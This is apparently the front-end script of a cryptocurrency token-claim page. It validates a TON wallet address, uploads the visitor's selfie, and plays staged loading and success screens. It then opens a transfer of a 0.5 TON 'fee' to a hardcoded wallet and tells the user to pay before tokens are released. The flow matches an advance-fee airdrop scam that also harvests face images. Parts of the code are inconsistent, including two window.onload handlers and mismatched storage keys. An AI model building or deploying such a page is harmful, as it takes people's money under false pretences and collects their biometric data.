function validateWallet() {
    const walletInput = document.getElementById("walletInput").value;

    // TON wallet address validation pattern
    const tonWalletPattern = /^(EQ|UQ|kQ)[A-Za-z0-9_-]{44,47}$|^[A-Fa-f0-9]{66}$/;

    if (tonWalletPattern.test(walletInput)) {
        document.getElementById("walletAddress").textContent = `Wallet Address: ${walletInput}`;
        document.querySelector(".wallet-section").style.display = "none";
        document.getElementById("selfieSection").style.display = "block";
    } else {
        alert("Please enter a valid TON wallet address.");
    }
}

function uploadSelfie() {
    const selfieInput = document.getElementById("selfieInput");
    const file = selfieInput.files[0];

    if (!file) {
        alert("Please take a selfie to proceed.");
        return;
    }

    const formData = new FormData();
    formData.append('selfie', file);

    // Show the loading screen while processing the selfie
    document.getElementById("loading-screen").style.display = "flex";

    fetch('/upload-selfie', {
        method: 'POST',
        body: formData
    })
    .then(response => response.text())
    .then(data => {
        // Hide the loading screen after 5 seconds
        setTimeout(() => {
            document.getElementById("loading-screen").style.display = "none";
            
            // Show the success message for 2 seconds
            showSuccessMessage("Selfie successfully uploaded!");
            
            setTimeout(() => {
                document.getElementById("selfieSection").style.display = "none";
                document.getElementById("claimSection").style.display = "block";
            }, 2000);  // 2-second delay for the success message
        }, 5000);  // 5-second loading screen
    })
    .catch(error => {
        console.error('Error uploading selfie:', error);
        alert('An error occurred. Please try again.');
        document.getElementById("loading-screen").style.display = "none";
    });
}

function showSuccessMessage(message) {
    const successMessageElement = document.createElement("div");
    successMessageElement.classList.add("success-message");
    successMessageElement.textContent = message;

    // Append the success message to the body or any desired section
    document.body.appendChild(successMessageElement);

    // Show the message for 2 seconds, then remove it
    setTimeout(() => {
        successMessageElement.remove();
    }, 2000);
}


function simulatePaymentProcessing() {
    // Show the loading screen
    document.getElementById('loading-screen').style.display = 'flex';

    // Simulate a delay for processing
    setTimeout(() => {
        // Hide the loading screen
        document.getElementById('loading-screen').style.display = 'none';

        // Show the final message with the wallet address
        const walletAddress = localStorage.getItem('connectedWalletAddress') || 'Not Found';
        document.getElementById('finalMessage').innerHTML = `kindly complete the payment to recieve your tokens in your wallet (${walletAddress}).`;
        document.getElementById('finalMessage').style.display = 'block';

    }, 10000);  // Simulates 5 seconds of processing time
}

// Call this function when the page loads
window.onload = simulatePaymentProcessing;


// Ensure the wallet address is saved at the beginning
function saveWalletAddress() {
    const walletAddress = document.getElementById("walletInput").value;
    localStorage.setItem('connectedWalletAddress', walletAddress);
}

// Call saveWalletAddress function when the wallet address is validated
document.getElementById('connectButton').addEventListener('click', saveWalletAddress);


function processClaim() {
    const tonWalletAddress = "UQDSOFFZP-Ax-U28GLRZAojOkm4UDBtGT97GNRjLpKgdZwFF"; // Replace with your actual TON wallet address
    const feeInTon = 0.5; // Fee amount in TON
    const feeInNanoTon = feeInTon * 1_000_000_000;
    const paymentUrl = `ton://transfer/${tonWalletAddress}?amount=${feeInNanoTon}`;

    // Open TON wallet payment
    window.open(paymentUrl, '_blank');

    // Simulate a delay for payment processing and redirect to processing page
    setTimeout(() => {
        window.location.href = "webpay2.html"; // Redirect to a payment processing page
    }, 1000);
}
// Simulate payment processing after loading the page
window.onload = function() {
    // Simulate a 5-second delay to display the loading screen
    setTimeout(() => {
        // Hide the loading screen
        document.getElementById('loading-screen').style.display = 'none';

        // Show the final message and the connected wallet address
        document.getElementById('finalMessage').style.display = 'block';
        
        // Retrieve and display the connected wallet address
        const connectedWallet = localStorage.getItem('connectedWallet');
        document.getElementById('connectedWallet').textContent = connectedWallet ? connectedWallet : 'No wallet found';
    }, 5000); // 5-second delay
};
